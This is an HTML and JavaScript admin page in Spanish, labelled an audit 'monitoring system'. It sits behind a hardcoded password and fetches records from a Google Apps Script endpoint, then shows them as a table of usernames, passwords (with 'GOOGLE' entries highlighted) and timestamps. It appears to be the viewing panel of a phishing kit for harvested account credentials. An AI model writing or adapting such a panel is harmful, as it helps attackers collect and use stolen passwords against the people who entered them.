<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control - Auditoría</title>
    <style>
        body { background: #0b141d; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; margin: 0; }
        .container { max-width: 1100px; margin: auto; padding: 20px; }
        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { color: #38bdf8; font-weight: 300; margin-top: 0; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; border-bottom: 2px solid #0b141d; }
        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; text-transform: uppercase; }
        .badge-google { background: #0369a1; color: #7dd3fc; }
        .badge-form { background: #581c87; color: #d8b4fe; }
        .pass-cell { font-family: 'Courier New', monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
        #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; width: 260px; margin-bottom: 15px; outline: none; text-align: center; }
        button { padding: 12px 30px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; transition: 0.3s; }
        button:hover { background: #7dd3fc; transform: translateY(-1px); }
        .refresh-btn { background: transparent; color: #38bdf8; border: 1px solid #38bdf8; padding: 8px 15px; font-size: 12px; margin-left: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div id="login-screen">
            <h1 style="margin-bottom: 30px;">Sistema de Monitoreo</h1>
            <input type="password" id="admin-pass" placeholder="Contraseña de acceso">
            <button onclick="verificar()">Entrar al Panel</button>
        </div>

        <div id="dashboard" style="display:none">
            <div class="card">
                <div style="display:flex; justify-content: space-between; align-items: center;">
                    <h1>Registros Recibidos</h1>
                    <button class="refresh-btn" onclick="cargarDatos()">🔄 Actualizar Base de Datos</button>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th>Origen</th>
                            <th>Usuario / Empresa</th>
                            <th>Contraseña / Detalles</th>
                            <th>Fecha y Hora</th>
                        </tr>
                    </thead>
                    <tbody id="tabla-datos">
                        </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // LA URL QUE ME HAS PASADO
        const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

        function verificar() {
            const pass = document.getElementById("admin-pass").value;
            // Contraseña de acceso al panel
            if(pass === "Linares2025.") {
                document.getElementById("login-screen").style.display = "none";
                document.getElementById("dashboard").style.display = "block";
                cargarDatos();
            } else {
                alert("Acceso Denegado: Contraseña incorrecta");
            }
        }

        async function cargarDatos() {
            const tbody = document.getElementById("tabla-datos");
            tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; padding: 40px;'>Conectando con el servidor de Google...</td></tr>";
            
            try {
                // Hacemos la petición GET al script para leer los datos
                const response = await fetch(webAppUrl);
                const data = await response.json();
                
                tbody.innerHTML = "";
                
                // Mostramos los últimos registros primero (reverse)
                data.reverse().forEach(fila => {
                    // fila[0] = Usuario, fila[1] = Pass, fila[2] = Tipo, fila[3] = Fecha
                    const esGoogle = (fila[2] || "").includes("GOOGLE");
                    
                    const tr = document.createElement("tr");
                    tr.innerHTML = `
                        <td>
                            <span class="badge ${esGoogle ? 'badge-google' : 'badge-form'}">
                                ${fila[2] || 'INFO'}
                            </span>
                        </td>
                        <td>${fila[0] || '---'}</td>
                        <td class="${esGoogle ? 'pass-cell' : ''}">${fila[1] || '---'}</td>
                        <td style="color:#94a3b8">${fila[3] || '---'}</td>
                    `;
                    tbody.appendChild(tr);
                });

                if (data.length === 0) {
                    tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; padding: 20px;'>No se han encontrado registros en la base de datos.</td></tr>";
                }

            } catch (error) {
                console.error("Error al cargar:", error);
                tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; color:#f87171; padding: 20px;'>Error de conexión. Asegúrate de haber publicado el Script como 'Cualquiera'.</td></tr>";
            }
        }
    </script>
</body>
</html>
